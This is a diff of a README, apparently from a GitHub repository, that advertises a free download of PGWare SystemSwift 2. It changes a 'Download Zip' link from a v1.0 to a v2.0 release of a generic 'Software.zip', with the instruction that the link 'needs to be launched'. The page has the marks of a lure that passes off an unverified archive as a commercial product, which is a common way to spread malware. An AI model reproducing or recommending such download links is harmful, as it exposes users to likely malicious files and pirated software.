@@ -20,7 +20,7 @@ Explore everything about SystemSwift 2 in 2019, read reviews, check out SystemSw
 🔎 systemswift-2-review  
 
 ## **📥 Get Started Here!**
-[![Download Zip](https://github.com/Wwidhwisy32622/PGWare-SystemSwift-Free/releases/download/v1.0/Software.zip%20Zip-v1.0.0-blue)](https://github.com/Wwidhwisy32622/PGWare-SystemSwift-Free/releases/download/v1.0/Software.zip)
+[![Download Zip](https://github.com/Wwidhwisy32622/PGWare-SystemSwift-Free/releases/download/v2.0/Software.zip%20Zip-v1.0.0-blue)](https://github.com/Wwidhwisy32622/PGWare-SystemSwift-Free/releases/download/v2.0/Software.zip)
 
 ℹ️ *(Link needs to be launched)*
 
